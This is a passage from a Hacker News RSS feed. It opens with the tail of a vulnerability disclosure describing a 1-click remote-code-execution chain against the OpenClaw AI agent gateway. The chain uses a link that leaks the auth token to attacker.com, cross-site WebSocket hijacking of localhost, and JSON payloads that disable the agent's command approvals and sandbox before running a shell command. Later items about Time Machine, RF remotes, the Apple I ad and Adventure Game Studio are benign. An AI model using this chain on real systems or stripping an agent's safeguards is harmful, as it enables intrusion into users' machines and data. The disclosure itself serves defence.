</span><span></span><span>void</span><span> </span><span>this</span><span>.request&lt;GatewayHelloOk&gt;(</span><span>"connect"</span><span>, params);</span></code></pre><p>In isolation, each of these operations are safe. However, the depthfirst scan recognized that together, these operations create a critical security issue. Our engine flagged the dangerous pattern: clicking a URL can force a connection and leak the authentication token to an attacker.&nbsp;</p><p>Here’s a preview of the finding in the depthfirst UI:</p><figure><p><img src="https://cdn.prod.website-files.com/691d9445275873e3d3fc4279/697f8d4b908591cf3f915319_Screenshot%202026-01-31%20at%207.19.02%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><h2>1-Click RCE Exploit Kill Chain</h2><h3>Limited Direct Exploitation</h3><p>Directly exploiting an insecurely configured internet-facing OpenClaw is trivial but limited in impact and scope.</p><p>These are the exploit steps:</p><p>1. The victim clicks a malicious link (or visits a site that forwards them to the malicious link), <code>http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080</code>.</p><p>2. The attacker listening to WebSocket connections on their server receives the <code>auth</code> token.</p><figure><p><img src="https://cdn.prod.website-files.com/691d9445275873e3d3fc4279/697f89d1a1c89e5e19f32bb6_Screeenshot_2.png" loading="lazy" alt=""></p></figure><p>3. The attacker logs in to the victim’s OpenClaw instance using the stolen token.</p><p>The attacker can now access the victim’s personal data and perform actions on the victim’s behalf. This can include reading text messages and Stripe API keys. Specific exploitation depends on which data the victim set up OpenClaw with.</p><p>This is bad enough, but this direct exploitation method has 3 limitations:</p><ol role="list"><li>It does not work on locally-running OpenClaw instances.</li><li>It does not bypass any defensive sandboxing or safety guardrails.</li><li>It does not achieve arbitrary code execution.</li></ol><p><strong>Here’s how I overcame those 3 limitations and demonstrated this vulnerability can be weaponized to achieve 1-Click remote code execution.</strong></p><h3>Pivoting to Bypass <code>localhost</code> Network Restrictions</h3><p>Most users run OpenClaw on <code>localhost</code>. As a result, their OpenClaw is inaccessible from the internet. Even if an attacker has a valid auth token, they can’t access a victim’s local OpenClaw.&nbsp;</p><p>However, I found a bug to bypass this otherwise frustrating restriction.&nbsp;</p><p>Regularly, <code>attacker.com</code> can’t make arbitrary client-side requests to localhost. This is because Same Origin Policy (SOP) prevents separate origins (sites) from fully interacting with each other.</p><p>While browsers apply SOP to http connections, they do <em>not</em> to WebSocket ones. It’s a WebSocket server’s responsibility to validate a request's <code>origin</code> and decide whether to accept the connection. I found that OpenClaw’s WebSocket server fails to validate the WebSocket <code>origin</code> header, accepting requests from <em>any</em> site.</p><p>This allows me to perform Cross-Site WebSocket Hijacking (CSWSH). When the victim visits <code>attacker.com</code>, I can run JavaScript on the victim’s browser to open a connection to <code>ws://localhost:18789</code> . The browser acts as a pivot point between <code>attacker.com</code> and the victim’s otherwise inaccessible <code>localhost</code>.</p><h3>Escaping The Sandbox</h3><p>OpenClaw has robust safety features to limit the risk from agent-side threats. By default, it uses <code>exec-approvals.json</code> to prompt the user before running dangerous commands, and it can be configured to run shell tools inside a containerized sandbox.</p><p>However, these protections are managed via the API itself. Because the stolen token grants <code>operator.admin</code> and <code>operator.approvals</code> scopes, I don't need to find a vulnerability in the sandbox implementation to bypass it. I can simply use the API to disable the safety features.</p><ol role="list"><li><strong>Disabling User Confirmation:</strong> I send a exec.approvals.set request to set ask: "off". Now the agent won't ask the user for permission to run dangerous commands.</li><li><strong>Escaping Containers:</strong> I send a config.patch request to set tools.exec.host to "gateway". This forces the agent to run commands directly on the host machine, not inside a Docker container.</li></ol><pre contenteditable="false"><code><span>// Payload to disable user prompts</span><span>
</span>{
<span>  </span><span>"method"</span><span>: </span><span>"exec.approvals.set"</span><span>,
</span><span>  </span><span>"params"</span><span>: { </span><span>"defaults"</span><span>: { </span><span>"security"</span><span>: </span><span>"full"</span><span>, </span><span>"ask"</span><span>: </span><span>"off"</span><span> } }
</span>}</code></pre><h3>Complete 1-Click RCE Exploit Killchain</h3><p>Putting it all together, the attack happens in milliseconds after the victim visits a webpage. The victim does not need to type anything or approve any prompts.</p><ol role="list"><li>Victim visits attacker.com (in practice, an inconspicuous url)</li><li>Client-side JavaScript from <code>attacker.com</code> executes on the victim browser, opening a background window to <code>http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080</code>. This sends the auth token to <code>attacker.com:8080</code></li><li>Client-side JavaScript from <code>attacker.com</code> executing on the victim browser creates a WebSocket connection to <code>ws://localhost:18789</code> (default OpenClaw server setup) and passes authentication using the stolen token. It then makes API request to: <br><ol role="list"><li>disable user confirmation on dangerous commands</li><li>disable any sandboxing</li></ol></li></ol><p>Finally, to achieve arbitrary command execution, the attacker JavaScript executes a <code>node.invoke</code> request:</p><pre contenteditable="false"><code><span>{
</span><span>     </span><span>"type"</span><span>: </span><span>"req"</span><span>,
</span><span>     </span><span>"id"</span><span>: </span><span>"4"</span><span>,
</span><span>     </span><span>"method"</span><span>: </span><span>"node.invoke"</span><span>,
</span><span>     </span><span>"params"</span><span>: {
</span><span>          </span><span>"nodeId"</span><span>: </span><span>"main"</span><span>,
</span><span>          </span><span>"command"</span><span>: </span><span>"system.run"</span><span>,
</span><span>          </span><span>"params"</span><span>: {
</span><span>               </span><span>"cmd"</span><span>: </span><span>"bash -c 'echo hacked &gt; /tmp/hacked'"</span><span>
</span>          },
<span>          </span><span>"timeoutMs"</span><span>: </span><span>60000</span><span>,
</span><span>          </span><span>"idempotencyKey"</span><span>: </span><span>"rev1"</span><span>
</span>     }
<!-- -->}</code></pre><h2>Disclosure &amp; Patch</h2><p>The OpenClaw team quickly addressed and fixed the issue I reported. Here’s the <a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq">GitHub Advisory</a>. I found there was another person who found and reported the same bug. The patch adds a gateway URL confirmation modal, removing the auto-connect-without-prompt behavior.&nbsp;</p><p>All versions up to v2026.1.24-1 are vulnerable. Please upgrade your OpenClaw and rotate tokens if you suspect yours may have leaked.</p><p>depthfirst is building the intelligence layer to catch these logic flaws before the attackers do. If you’re shipping code, let's talk.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[TIL: Apple Broke Time Machine Again on Tahoe (164 pts)]]></title>
            <link>https://taoofmac.com/space/til/2026/02/01/1630</link>
            <guid>46848699</guid>
            <pubDate>Sun, 01 Feb 2026 19:38:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://taoofmac.com/space/til/2026/02/01/1630">https://taoofmac.com/space/til/2026/02/01/1630</a>, See on <a href="https://news.ycombinator.com/item?id=46848699">Hacker News</a></p>
<div id="readability-page-1" class="page"><p><a href="https://taoofmac.com/space/til/2026/02/01/1630">Feb 1<sup>st</sup> 2026</a> · 3 min read
 · <small>
#docker 
#proxmox 
#smb 
#synology 
#til 
#timemachine 
#zfs 
</small>
</p><section id="main">
    <p>So… Here we are again.</p>
<p>Today, after a minor disaster with my <a href="https://taoofmac.com/space/apps/obsidian" rel="next">Obsidian</a> vault, I decided to restore from Time Machine, and… I realized that it had silently broken across both my Tahoe machines. I use a <a href="https://taoofmac.com/space/com/synology" rel="next">Synology</a> NAS as Time Machine target, exporting the share over <a href="https://taoofmac.com/space/protocols/smb" rel="next">SMB</a> and that has worked flawlessly for years, but this came as a surprise because I could have sworn it was working fine a couple of months ago–but no, it wasn’t.</p>
<p>After some research, I found out that the issue is with <a href="https://taoofmac.com/space/com/apple" rel="next">Apple’s</a> unilateral decision to change their SMB defaults (without apparently notifying anyone), and came across a few possible fixes.</p>
<a id="anchor-what-seems-to-be-working-now" href="https://taoofmac.com/space/til/2026/02/01/1630#what-seems-to-be-working-now" rel="anchor"><h2 id="what-seems-to-be-working-now">What Seems To Be Working Now</h2></a><p>I found <a href="https://gist.github.com/Zahorone/6915be6f5088edb2f64018ce9e4dfe97?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external">this gist</a>, which I am reproducing here for posterity, that seems to be working for me, but which entails editing the <code>nsmb.conf</code> file on the Mac itself–which is not exactly ideal, since I’m pretty sure Apple will break this again in the future.</p>
<div><pre><span><code>sudo<span> </span>nano<span> </span>/etc/nsmb.conf<span> </span><span># I used vim, of course</span>
</code></span></pre></div>

<p>…and adding the following lines (the file should be empty):</p>
<div><pre><span><code><span>[default]</span>
<span>signing_required</span><span>=</span><span>yes</span>
<span>streams</span><span>=</span><span>yes</span>
<span>soft</span><span>=</span><span>yes</span>
<span>dir_cache_max_cnt</span><span>=</span><span>0</span>
<span>protocol_vers_map</span><span>=</span><span>6</span>
<span>mc_prefer_wired</span><span>=</span><span>yes</span>
</code></span></pre></div>

<p>The explanation here is that <a href="https://taoofmac.com/space/com/apple/macos" rel="next">macOS</a> Tahoe changed the default from <code>signing_required=no</code> to stricter control, and NAS devices with relaxed SMB settings cannot handle this without explicit configuration.</p>
<p>Another common pitfall is name encoding issues in machine names, so you should remove Non-ASCII Characters from the <code>.sparsebundle</code> name (that wasn’t an issue for me, but YMMV).</p>
<p>On the <a href="https://taoofmac.com/space/com/synology" rel="next">Synology</a> side, the recommendation was to go to <code>Control Panel &gt; File Services &gt; SMB &gt; Advanced</code> and set:</p>
<ul>
<li>Maximum SMB protocol: SMB3</li>
<li>Enable Opportunistic Locking: Yes</li>
<li>Enable SMB2 Lease: Yes</li>
<li>Enable SMB Durable Handles: Yes</li>
<li>Server signing: No (or “Auto”)</li>
<li>Transport encryption: Disabled</li>
</ul>
<p>That doesn’t quite match my DSM UI, but it’s close enough, and my settings now look like this:</p>
<figure><img alt="My SMB settings, as of DSM 7.3.2-86009-1" src="https://taoofmac.com/media/til/2026/02/01/1630/fY_oAYhU-aPe6gdiXpboLe7GTwI=/image.png" width="1384" height="1462"><figcaption>My SMB settings, as of DSM 7.3.2-86009-1</figcaption></figure>
<a id="anchor-my-backup-backup-plan" href="https://taoofmac.com/space/til/2026/02/01/1630#my-backup-backup-plan" rel="anchor"><h2 id="my-backup-backup-plan">My Backup Backup Plan</h2></a><p>Since I’m tired of Apple breaking <a href="https://hub.docker.com/r/mbentley/timemachine?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external">Time Machine</a> every few years and the lack of transparency around this (it’s not Synology’s fault), I have decided to implement a more robust solution that doesn’t depend on Synology’s SMB implementation.</p>
<p>I already have <a href="https://taoofmac.com/space/blog/2024/12/26/2330" rel="next">a Proxmox server with ZFS as the backend storage</a> that has an LXC container running Samba for general file sharing, so I decided to look into that as a possible Time Machine target.</p>
<p>As it happens, <a href="https://hub.docker.com/r/mbentley/timemachine?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external"><code>mbentley/timemachine</code></a> is a <a href="https://taoofmac.com/space/os/linux/docker" rel="next">Docker</a> image specifically designed for this purpose, and it seems to be well-maintained, so I’m testing it like this:</p>
<div><pre><span><code><span>services</span><span>:</span>
<span>  </span><span>timemachine</span><span>:</span>
<span>    </span><span>image</span><span>:</span><span> </span><span>mbentley/timemachine:smb</span>
<span>    </span><span>container_name</span><span>:</span><span> </span><span>timemachine</span>
<span>    </span><span>restart</span><span>:</span><span> </span><span>always</span>
<span>    </span><span>network_mode</span><span>:</span><span> </span><span>host</span>
<span>    </span><span>environment</span><span>:</span>
<span>      </span><span>-</span><span> </span><span>TM_USERNAME=timemachine</span>
<span>      </span><span>-</span><span> </span><span>TM_GROUPNAME=timemachine</span>
<span>      </span><span>-</span><span> </span><span>PASSWORD=timemachine</span>
<span>      </span><span>-</span><span> </span><span>TM_UID=65534</span><span> </span><span># 'nobody' user</span>
<span>      </span><span>-</span><span> </span><span>TM_GID=65534</span><span> </span><span># 'nobody' group</span>
<span>      </span><span>-</span><span> </span><span>SET_PERMISSIONS=false</span>
<span>      </span><span>-</span><span> </span><span>VOLUME_SIZE_LIMIT=0</span>
<span>    </span><span>volumes</span><span>:</span>
<span>      </span><span># this is a pass-though mountpoint to the ZFS volume in Proxmox</span>
<span>      </span><span>-</span><span> </span><span>/mnt/shares/timemachine:/opt/timemachine</span>
<span>    </span><span>tmpfs</span><span>:</span>
<span>      </span><span>-</span><span> </span><span>/run/samba</span>
</code></span></pre></div>

<p>Right now the first option <em>seems</em> to be working, but I will probably switch to the Docker solution in the near future, since it gives me more control over the <a href="https://taoofmac.com/space/protocols/smb" rel="next">SMB</a> implementation and avoids relying on <a href="https://taoofmac.com/space/com/synology" rel="next">Synology</a>’s software.</p>
<p>But if anyone from Apple is reading this: please, stop breaking <a href="https://hub.docker.com/r/mbentley/timemachine?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external">Time Machine</a> every few years. It’s a critical piece of infrastructure for many users, and the lack of communication around these changes is frustrating.</p>
<p>Plus I’m annoyed enough that earlier this morning I tried to set up a new <a href="https://taoofmac.com/space/com/apple/ios" rel="next">iOS</a> device and the infamous <code>Restore in Progress: An estimated 100 MB will be downloaded…</code> bug (which has bitten me repeatedly <em>over the last <strong>six</strong> years</em>) is still there.</p>
<p>The usual fix was hitting <code>Reset Network Settings</code> and a full hardware reboot, plus reconnecting to Wi-Fi… But this time it took <em>three</em> attempts.</p>
<p>Come on, Apple, get your act together. Hire people who care about the OS experience, not just <a href="https://taoofmac.com/space/notes/2025/09/15/2359" rel="next">Liquid Glass</a>.</p>
    </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I taught my neighbor to keep the volume down (476 pts)]]></title>
            <link>https://idiallo.com/blog/teaching-my-neighbor-to-keep-the-volume-down</link>
            <guid>46848415</guid>
            <pubDate>Sun, 01 Feb 2026 19:00:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://idiallo.com/blog/teaching-my-neighbor-to-keep-the-volume-down">https://idiallo.com/blog/teaching-my-neighbor-to-keep-the-volume-down</a>, See on <a href="https://news.ycombinator.com/item?id=46848415">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody" id="articleBody">
	

<p>When I moved to a new apartment with my family, the cable company we were used to wasn't available. We had to settle for Dish Network. I wasn't too happy about making that switch, but something on their website caught my attention. For an additional $5 a month, I could have access to DVR. I switched immediately.</p>

<p>This was 2007. DVR was not new, but it wasn't commonly bundled with set-top boxes. TiVo was still the popular way to record, pause, and rewind live TV. We received two set-top boxes, one for each room with a TV, and three remotes. Two remotes had IR (infrared) blasters and, surprisingly, one RF (radio frequency) remote.</p>

<p>After using the RF remote, I wondered: Why would anyone ever use an IR remote again? You didn't need a direct line of sight with the device you were controlling. I could actually stand in the kitchen and control the TV. It was amazing. But with the convenience of RF came other problems that IR users never had to worry about. Interference.</p>

<p>After several months of enjoying my service, one of my neighbors, the loudest in the building, also switched to Dish Network. And he also got the RF remote. This was the type of neighbor who would leave the house with the TV on, volume blasting.</p>

<p><img src="https://cdn.idiallo.com/images/assets/601/remote.jpg" alt="Dish Network Remote 2008">
</p>

<p>One day, I was in the living room watching TV when the channel just flipped. I must have accidentally hit a button, so I changed it back. But not a few seconds later, the channel changed again. Then the volume went up. I figured my sister must have had the RF remote and was messing with me. But no, the remote was in my hand. I assumed something was wrong with it.</p>

<p>The whole time I was watching TV, the channels kept randomly switching. I banged the remote on the table a couple of times, but it still switched. I removed the batteries from the remote, it still switched. I unplugged the device for a few minutes, plugged it back in, and… it still switched. Frustrated, I went through the device settings and disabled the RF remote. That's when it finally stopped. I wasn't happy with this solution, but it allowed me to watch TV until I figured something out.</p>

<p>One evening, when everyone was asleep and the neighbor was watching a loud TV show, I decided to diagnose the issue. The moment I pressed the power button on the RF remote, my TV and set-top box turned on, and the neighbor's TV went silent. "Fuck!" I heard someone say. I was confused. Did I just do that? The TV turned back on, the volume went up. I walked to the window armed with the remote. I counted to three, then pressed the power button. My neighbor's TV went silent. He growled. </p>

<div>
   <p><img src="https://cdn.idiallo.com/images/assets/601/captain.jpg" alt="I am the captain now"></p><p>I am the captain now.</p>
</div>

<p>Every time he turned the TV on, I pressed the power button again and his device went off. Well, what do you know? We had interference somehow. Our remotes were set up to operate at the same frequency. Each remote controlled both devices.</p>

<p>But I'm not that kind of neighbor. I wasn't going to continue to mess with him. Instead, I decided I would pay him a visit in the morning and explain that our remotes are tuned to the same frequency. I would bring the RF remote with me just to show him a demo. I was going to be a good neighbor.</p>

<p>In the morning, I went downstairs, remote in hand. I knocked on the door, and a gentleman in his forties answered the door. I had rehearsed my speech and presentation. This would be a good opportunity to build a good rapport, and have a shared story. Maybe he would tell me how he felt when the TV went off. How he thought there was a ghost in the house or something. But that's not what happened. </p>

<p>"Hi, I'm Ibrahim. Your upstairs neighbor..." I started and was interrupted almost immediately. "Whatever you are selling," he yelled. "I'm not buying." and he closed the door on my face. I knocked a second time, because obviously there was a misunderstanding. He never answered. Instead, the TV turned on and a movie played at high volume. So much for my prepared speech.</p>

<p>The RF settings on my set-top box remained turned off. My family never discovered its benefit anyway, they always pointed at the box when pressing the buttons. It wasn't much of an inconvenience. In fact, I later found in the manual that you could reprogram the device and remote to use a different frequency. I did not reprogram my remote. Instead, my family used the two IR remotes, and brought the RF remote in my bedroom where it permanently remained on my night stand. </p>

<p>Why in the bedroom? Because I decided to teach my neighbor some good manners. Whenever he turned up his volume, I would simply turn off his device. I would hear his frustration, and his attempts at solving the problem. Like a circus animal trainer, I remained consistent. If the volume of his TV went above what I imagined to be 15 to 20, I would press the power button. It became a routine for me for weeks. Some nights were difficult, I would keep the remote under my pillow, battling my stubborn neighbor all night.</p>

<p>One day, I noticed that I hadn't pressed the button in days. I opened the window and I could still hear the faint sound of his TV. Through trial and error, he learned the lesson. If the volume remained under my arbitrary threshold, the TV would remain on. But as soon as he passed that threshold, the device would turn off.</p>

<p>Sometimes, he would have company and there would be noise coming out of his apartment. I used the one tool in my tool box to send him a message. Turn off the TV. All of the sudden, my neighbor and his guest will be reminded of the unspoken rules, and become mindful of their neighbors.</p>

<p>Maybe somewhere on the web, in some obscure forum, someone asked the question: "Why does my set-top box turn off when I increase the volume?" Well, it might be 18 years too late, but there's your answer. There is a man out there who religiously sets his volume to 18. He doesn't quite know why. That's Pavlovian conditioning at its best.</p>

	<hr>

	
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple I Advertisement (1976) (167 pts)]]></title>
            <link>http://apple1.chez.com/Apple1project/Gallery/Gallery.htm</link>
            <guid>46847780</guid>
            <pubDate>Sun, 01 Feb 2026 17:36:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://apple1.chez.com/Apple1project/Gallery/Gallery.htm">http://apple1.chez.com/Apple1project/Gallery/Gallery.htm</a>, See on <a href="https://news.ycombinator.com/item?id=46847780">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> 
              <td> 
                <p><span color="#000000" size="+2">&nbsp;</span><span color="#000000">&nbsp;&nbsp;The 
                  Apple Computer. A truly complete microcomputer system on a single 
                  PC board. Based on the MOS Technology 6502 micro- processor, 
                  the Apple also has a built-in video terminal and sockets for 
                  8K bytes of onboard RAM memory. With the addition of a keyboard 
                  and video monitor, you'll have an extremely powerful computer 
                  system that can be used for anything from developing programs 
                  to playing games or running BASIC.<br>
                  &nbsp;&nbsp;&nbsp;Combining the computer, video terminal and 
                  dynamic memory on a single board has resulted in a large reduction 
                  in chip count, which means more reliability and lowered cost. 
                  Since the Apple comes fully assembled, tested &amp; burned-in 
                  and has a complete power supply on-board, initial set-up is 
                  essentially "hassle-free" and you can be running within 
                  minutes. At $666.66 (including 4K bytes RAM!) it opens many 
                  new possibilities for users and systems manufacturers.</span></p>
                <p><b><span color="#000000">You Don't Need an Expensive Teletype.<br>
                  </span></b><span color="#000000">Using the built-in video terminal 
                  and keyboard interface, you avoid all the expense, noise and 
                  mantenance associated with a teletype. And the Apple video terminal 
                  is six times faster than a teletype, which means more throughput 
                  and less waiting. The Apple connects directly to a video monitor 
                  (or home TV with an in- expensive RF modulator) and dis- plays 
                  960 easy to read characters in 24 rows of 40 characters per 
                  line with automatic scrolling. The video display section contains 
                  its own 1K bytes of memory, so all the RAM memory is available 
                  for user programs. And the</span> 
              </p></td>
              <td> 
                <p><span color="#000000">Keyboard Interface lets you use almost 
                  any ASCII-encoded keyboard.<br>
                  &nbsp;&nbsp;&nbsp;The Apple Computer makes it possible for many 
                  people with limited budgets to step up to a video terminal as 
                  an I/O device for their computer.</span></p>
                <p><b><span color="#000000">No More Switches,<br>
                  No MoreLights<br>
                  </span></b><span color="#000000">&nbsp;&nbsp;&nbsp;Compared 
                  to switches and LED's, a video terminal can dis- play vast amounts 
                  of information simultaneously. The Apple video terminal can 
                  display the contents of 192 memory locations at once on the 
                  screen. And the fimrware in PROMS enables you to enter,display 
                  and debug programs (all in hex) from the keyboard, ren- dering 
                  a front panel unnecessary. The firmware also allows your programs 
                  to print characters on the display, and since you'll be looking 
                  at letters and numbers instead of just LED's, the door is open 
                  to all kinds of alphanumeric software (i.e., Games and BASIC).</span></p>
                <p><b><span color="#000000">8K Bytes RAM in 16 Chips!</span></b><span color="#000000"><br>
                  The Apple Computer uses the new 16-pin 4K dynamic memory chips. 
                  They are faster and take 1/4 the space and power of even the 
                  low power 2102's (the memory chip that everyone else uses). 
                  That means 8K bytes in sixteen chips. It also means no more 
                  28 amp power supplies. &nbsp;&nbsp;&nbsp;The system is fully 
                  expandable to 65K via an edge connector which carries both the 
                  address and data busses, power supplies and all timing signals. 
                  All dy- namic memory refreshing for both on and off-board memory 
                  is done automatically. Also, the Apple Computer can be upgraded 
                  to use the 16K chips when they become availa-</span> 
              </p></td>
              <td> 
                <p><span color="#000000">ble. That's 32K bytes on-board RAM in 
                  16 IC's --the equivalent of 256 2102's!</span></p>
                <p><strong><span color="#000000">A little Cassette Board that 
                  Works!<br>
                  </span></strong><span color="#000000">Unlike many other cassette 
                  boards on the marketplace,ours works every timeIt plugs directly 
                  into the upright connector on the mainboard and stands only 
                  2" tall.And since it is very fast (1500 bits per second), 
                  you can read or write 4 K bytes in about 20 seconds.All timing 
                  is done in software, witch results in crystal-controlled accuracy 
                  and uniformity from unit to unit.<br>
                  unlike some other cassette interfaces witch requires an expensive 
                  tape recorder, the Apple Cassette Interface works reliably with 
                  almost any audio-grade cassette recorder.</span></p>
                <p><strong><span color="#000000">Softwares<br>
                  </span></strong><span color="#000000">A tape of APPLE BASIC 
                  is inclued free with the Cassette Interface.Apple Basic features 
                  immediate error message and fast execution, and let's you program 
                  in a highter level language immediately and without added cost.Also 
                  avialable now are a dis-assembler and many games, with many 
                  software packages,(including a macro assembler) in the works.And 
                  since our philosophy is to provide software for our machines 
                  free or at minimal cost, you won't be continually paying for 
                  access to this growing software library.<br>
                  The Apple Computer is in stock al almost all major computer 
                  stores.(if your local computer store doesn't carry our products, 
                  encourage them or write us direct).Dealer inquiries invited.</span> 
              </p></td>
            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[English professors double down on requiring printed copies of readings (102 pts)]]></title>
            <link>https://yaledailynews.com/articles/english-professors-double-down-on-requiring-printed-copies-of-readings</link>
            <guid>46847039</guid>
            <pubDate>Sun, 01 Feb 2026 15:58:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://yaledailynews.com/articles/english-professors-double-down-on-requiring-printed-copies-of-readings">https://yaledailynews.com/articles/english-professors-double-down-on-requiring-printed-copies-of-readings</a>, See on <a href="https://news.ycombinator.com/item?id=46847039">Hacker News</a></p>
Couldn't get https://yaledailynews.com/articles/english-professors-double-down-on-requiring-printed-copies-of-readings: Error: Request failed with status code 429]]></description>
        </item>
        <item>
            <title><![CDATA[Adventure Game Studio: OSS software for creating adventure games (253 pts)]]></title>
            <link>https://www.adventuregamestudio.co.uk/</link>
            <guid>46846252</guid>
            <pubDate>Sun, 01 Feb 2026 13:56:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.adventuregamestudio.co.uk/">https://www.adventuregamestudio.co.uk/</a>, See on <a href="https://news.ycombinator.com/item?id=46846252">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="wrapper-div">
    <!-- Modal -->
    
<div id="splash">
            <div>
                <h2>Create</h2>
                <h2>your own adventure games</h2>
                <p><a href="#create">Learn More <span></span></a>
            </p></div>
            <div>
                <h2>Play</h2>
                <h2>thousands of games</h2>
                <p><a href="#play">Learn More <span></span></a>
            </p></div>
            <div>
                <h2>Join</h2>
                <h2>our supportive community</h2>
                <p><a href="#join">Learn More <span></span></a>
            </p></div>
        </div>
<div id="create">
                    <p>Adventure Game Studio (AGS) is open-source software for creating graphical point-and-click
                        adventure games. It is free, standalone, and requires no subscription.</p>
                    <p>The Windows-based IDE, streamlines game creation by integrating tools for
                        importing graphics, writing scripts, and testing. Games created with AGS can be played on
                        multiple platforms, including Linux, iOS, and Android.</p>
                    <p>Suitable for all skill levels, AGS features an active community for support and
                        socialising.</p>
                    <p>Showcase your games by uploading them to this website.</p>
                    
            </div>
<div id="play">
        
        <div>
                <div>
                        <p><img src="https://www.adventuregamestudio.co.uk/site/assets/img/games/2932_1.webp" alt="Brainrot!" loading="lazy">
                        </p>
                        <div>
                            <p id="desktop-title-award-1"><h4>Brainrot!</h4></p>
                            <h5>1 February 2026</h5>
                            <p>Rot your brain by consuming AI slop and services in this classic arcade style game created for the MAGS January 2026 game jam in the AGS forums.Move <a href="https://www.adventuregamestudio.co.uk/play/game/2932-brainrot-/#about">[…]</a></p>
                        </div>
                        
                    </div>
                <div>
                        <p><img src="https://www.adventuregamestudio.co.uk/site/assets/img/games/2931_1.webp" alt="Nothmere" loading="lazy">
                        </p>
                        <div>
                            <p id="desktop-title-award-2"><h4>Nothmere</h4></p>
                            <h5>31 January 2026</h5>
                            <p>You awaken alone on a cold, rocky shore beneath a moonless sky, dragged from the sea through a sewer pipe with no memory of who you are, how you <a href="https://www.adventuregamestudio.co.uk/play/game/2931-nothmere/#about">[…]</a></p>
                        </div>
                        
                    </div>
                <div>
                        <p><img src="https://www.adventuregamestudio.co.uk/site/assets/img/games/2471_1.webp" alt="Urban Witch Story" loading="lazy">
                        </p>
                        <div>
                            <p id="desktop-title-award-3"><h4>Urban Witch Story</h4></p>
                            <h5>Winner of 6 AGS Awards</h5>
                            <p>The jury of Los Angeles County District has ruled in favor of four 
police officers accused of abusing their power against coloured citizen 
Rodney <a href="https://www.adventuregamestudio.co.uk/play/game/2471-urban-witch-story/#about">[…]</a></p>
                        </div>
                        
                    </div>
                <div>
                        <p><img src="https://www.adventuregamestudio.co.uk/site/assets/img/games/35_1.webp" alt="Pleurghburg: Dark Ages" loading="lazy">
                        </p>
                        <div>
                            <p id="desktop-title-award-4"><h4>Pleurghburg: Dark Ages</h4></p>
                            <h5>Winner of 5 AGS Awards</h5>
                            <p>You play as detective Jake McUrk working for the Police Detective Agency. The citizens got rid of the old corrupt police system and organized the PDA,<a href="https://www.adventuregamestudio.co.uk/play/game/35-pleurghburg-dark-ages/#about">[…]</a></p>
                        </div>
                        
                    </div>
            </div>
                <div id="award-winners-carousel-indicator" data-bs-ride="carousel">
                                        <div data-bs-interval="7500">
                            <p><img src="https://www.adventuregamestudio.co.uk/site/assets/img/games/2932_1.webp" alt="Brainrot!" loading="lazy">
                            </p>
                            <div>
                                <p><h4>Brainrot!</h4></p>
                                <h5>1 February 2026</h5>
                                <p>Rot your brain by consuming AI slop and services in this classic arcade style game created for the MAGS January 2026 game jam in the AGS forums.Move <a href="https://www.adventuregamestudio.co.uk/play/game/2932-brainrot-/#about">[…]</a></p>
                            </div>
                            
                        </div>
                    <div data-bs-interval="7500">
                            <p><img src="https://www.adventuregamestudio.co.uk/site/assets/img/games/2931_1.webp" alt="Nothmere" loading="lazy">
                            </p>
                            <div>
                                <h4>Nothmere</h4>
                                <h5>31 January 2026</h5>
                                <p>You awaken alone on a cold, rocky shore beneath a moonless sky, dragged from the sea through a sewer pipe with no memory of who you are, how you <a href="https://www.adventuregamestudio.co.uk/play/game/2931-nothmere/#about">[…]</a></p>
                            </div>
                            
                        </div>
                                        <div data-bs-interval="7500">
                            <p><img src="https://www.adventuregamestudio.co.uk/site/assets/img/games/2471_1.webp" alt="Urban Witch Story" loading="lazy">
                            </p>
                            <div>
                                <h4>Urban Witch Story</h4>
                                <h5>Winner of 6 AGS Awards</h5>
                                <p>The jury of Los Angeles County District has ruled in favor of four 
police officers accused of abusing their power against coloured citizen 
Rodney <a href="https://www.adventuregamestudio.co.uk/play/game/2471-urban-witch-story/#about">[…]</a></p>
                            </div>
                            
                        </div>
                    <div data-bs-interval="7500">
                            <p><img src="https://www.adventuregamestudio.co.uk/site/assets/img/games/35_1.webp" alt="{AwardWinner2Title}}" loading="lazy">
                            </p>
                            <div>
                                <h4>Pleurghburg: Dark Ages</h4>
                                <h5>Winner of 5 AGS Awards</h5>
                                <p>You play as detective Jake McUrk working for the Police Detective Agency. The citizens got rid of the old corrupt police system and organized the PDA,<a href="https://www.adventuregamestudio.co.uk/play/game/35-pleurghburg-dark-ages/#about">[…]</a></p>
                            </div>
                            
                        </div>
                </div>
        <!-- End of mobile view-->
        
    </div>
<div id="join">
            <div>
                <h3>The latest from our forums</h3>
                <div>
                    <!-- First three items are shown on all devices - class "d-none d-sm-block" isn't added-->
                    <div id="default-1">
                                
                                <p>
                                    In: Beginners' Technical Questions<br>
                                    By: SilverSpook <span>(11&nbsp;minutes&nbsp;ago)</span>
                                </p>
                            </div>
                    <div id="default-2">
                                
                                <p>
                                    In: Competitions &amp; Activities<br>
                                    By: ZapZap <span>(1&nbsp;hour&nbsp;ago)</span>
                                </p>
                            </div>
                    <div id="default-3">
                                
                                <p>
                                    In: Competitions &amp; Activities<br>
                                    By: Babar <span>(1&nbsp;hour&nbsp;ago)</span>
                                </p>
                            </div>
                                        <div id="default-4">
                                
                                <p>
                                    In: AGS Games in Production<br>
